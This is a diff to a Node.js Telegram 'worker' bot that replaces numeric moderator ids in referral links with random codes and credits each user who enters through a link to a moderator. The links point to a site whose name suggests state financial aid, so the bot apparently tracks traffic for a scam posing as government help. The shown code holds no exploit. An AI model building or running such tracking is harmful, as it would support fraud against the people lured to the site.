@@ -50,6 +50,8 @@ async function safeDelete(bot, chatId, msgId) {
 // ===== БАЗЫ =====
 let moderators = [];
 let usersByUsername = {};
+let refCodes = {};      // код -> id модера
+let modRefCode = {};    // id модера -> код
 
 let takenRequests = {};
 let fullRequests = {};
@@ -61,9 +63,26 @@ let onlineUsers = {};
 let bannedUsers = {};
 let userStatus = {};
 let extraSentUsers = {};
-
-// ===== REF СИСТЕМА =====
 let userRef = {};
+
+// ===== ГЕНЕРАЦИЯ КОДА =====
+function generateCode() {
+  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+  let code = "";
+  for (let i = 0; i < 8; i++) {
+    code += chars[Math.floor(Math.random() * chars.length)];
+  }
+  return code;
+}
+
+function getOrCreateCode(id) {
+  if (modRefCode[id]) return modRefCode[id];
+  let code;
+  do { code = generateCode(); } while (refCodes[code]);
+  refCodes[code] = id;
+  modRefCode[id] = code;
+  return code;
+}
 
 // ===== ONLINE =====
 function isOnline(id) {
@@ -85,6 +104,7 @@ workerBot.onText(/\/start/, (msg) => {
   }
 
   usersByUsername[username.toLowerCase()] = id;
+  getOrCreateCode(id); // сразу генерируем код
 
   safeSend(workerBot, id, "✅ Ты зарегистрирован");
 });
@@ -122,7 +142,6 @@ workerBot.onText(/\/mods/, (msg) => {
   const list = moderators.map(id => {
     const entry = Object.entries(usersByUsername)
       .find(([u, i]) => i === id);
-
     return entry ? "@" + entry[0] : id;
   }).join("\n");
 
@@ -137,7 +156,8 @@ workerBot.onText(/\/mylink/, (msg) => {
     return safeSend(workerBot, id, "❌ Ты не модератор");
   }
 
-  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${id}`;
+  const code = getOrCreateCode(id);
+  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${code}`;
 
   safeSend(workerBot, id, `🔗 Твоя ссылка:\n${link}`);
 });
@@ -151,15 +171,14 @@ app.post("/enter", async (req, res) => {
 
   onlineUsers[id] = Date.now();
 
-  // ===== РЕФ =====
   if (ref && !userRef[id]) {
-    const modId = Number(ref);
+    const modId = refCodes[ref]; // ищем по коду
 
-    if (!isNaN(modId) && modId > 0) {
+    if (modId) {
       const entry = Object.entries(usersByUsername).find(([u, i]) => i === modId);
       userRef[id] = entry ? "@" + entry[0] : `id:${modId}`;
-    } else if (typeof ref === "string" && ref.length > 0) {
-      userRef[id] = ref.startsWith("@") ? ref : "@" + ref;
+    } else {
+      userRef[id] = "неизвестно";
     }
   }
 
